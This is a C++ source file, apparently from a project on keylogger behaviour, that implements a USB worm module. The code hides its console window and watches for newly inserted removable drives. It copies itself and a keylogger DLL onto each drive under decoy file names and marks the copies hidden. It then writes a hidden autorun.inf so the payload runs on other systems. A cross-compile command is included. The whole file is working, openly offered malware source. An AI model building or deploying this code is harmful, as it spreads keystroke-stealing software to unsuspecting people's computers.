/*
 * usb_propagator.cpp
 * FMA Project - Behavioural Analysis of a Keylogger
 * 
 * USB propagation module. Monitors for removable drive insertion
 * and copies the keyloader payload with autorun.inf for
 * automatic execution when the USB is opened on another system.
 *
 * Compile (from Kali):
 *   x86_64-w64-mingw32-g++-posix -o build/usb_propagator.exe src/usb_propagator.cpp \
 *     -luser32 -lshell32 -mwindows -static-libgcc -static-libstdc++ -Os -s
 */

#include <windows.h>
#include <string>
#include <fstream>
#include <vector>

// ========== Create autorun.inf on target drive ==========
void create_autorun(const std::string& drivePath, const std::string& payloadName) {
    std::string autorunPath = drivePath + "autorun.inf";
    std::ofstream autorun(autorunPath);
    
    if (!autorun.is_open()) return;
    
    autorun << "[AutoRun]\n";
    autorun << "action=Open folder to view files\n";
    autorun << "icon=explorer.exe\n";
    autorun << "label=USB_Drive\n";
    autorun << "open=" << payloadName << "\n";
    autorun << "shell\\open\\command=" << payloadName << "\n";
    autorun << "shell\\explore\\command=" << payloadName << "\n";
    autorun.close();
    
    // Hide the autorun file
    SetFileAttributesA(autorunPath.c_str(), 
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
}

// ========== Copy payload to a removable drive ==========
void infect_drive(const std::string& drivePath) {
    // Use varied payload names for stealth
    const char* names[] = {
        "USB_Driver_Installer.exe",
        "photo_album_viewer.exe",
        "readme_help.exe",
        "folder_contents.exe",
        "usb_fix_tool.exe"
    };
    
    srand(GetTickCount());
    int idx = rand() % 5;
    
    std::string destPayload = drivePath + names[idx];
    std::string destDll = drivePath + "keylogger_dll.dll";
    
    // Get source paths
    char currentExe[MAX_PATH];
    GetModuleFileNameA(NULL, currentExe, MAX_PATH);
    
    char currentDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, currentDir);
    std::string srcDll = std::string(currentDir) + "\\keylogger_dll.dll";
    
    // Copy files
    CopyFileA(currentExe, destPayload.c_str(), FALSE);
    CopyFileA(srcDll.c_str(), destDll.c_str(), FALSE);
    
    // Hide files
    SetFileAttributesA(destPayload.c_str(), 
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    SetFileAttributesA(destDll.c_str(), 
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    // Create autorun
    create_autorun(drivePath, names[idx]);
}

// ========== Get list of removable drives ==========
std::vector<std::string> get_removable_drives() {
    std::vector<std::string> drives;
    char buf[256];
    
    DWORD result = GetLogicalDriveStringsA(sizeof(buf), buf);
    if (result == 0 || result > sizeof(buf)) return drives;
    
    char* drive = buf;
    while (*drive) {
        if (GetDriveTypeA(drive) == DRIVE_REMOVABLE) {
            drives.push_back(std::string(drive));
        }
        drive += strlen(drive) + 1;
    }
    
    return drives;
}

// ========== USB monitor thread ==========
DWORD WINAPI monitor_thread(LPVOID) {
    std::vector<std::string> known = get_removable_drives();
    
    while (true) {
        Sleep(3000); // Check every 3 seconds
        
        std::vector<std::string> current = get_removable_drives();
        
        for (const auto& d : current) {
            bool found = false;
            for (const auto& k : known) {
                if (d == k) { found = true; break; }
            }
            if (!found) {
                infect_drive(d); // New USB detected!
            }
        }
        
        known = current;
    }
    
    return 0;
}

// ========== Entry point ==========
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Hide console
    HWND consoleWnd = GetConsoleWindow();
    if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);
    
    // Start monitoring
    CreateThread(NULL, 0, monitor_thread, NULL, 0, NULL);
    
    // Keep alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}
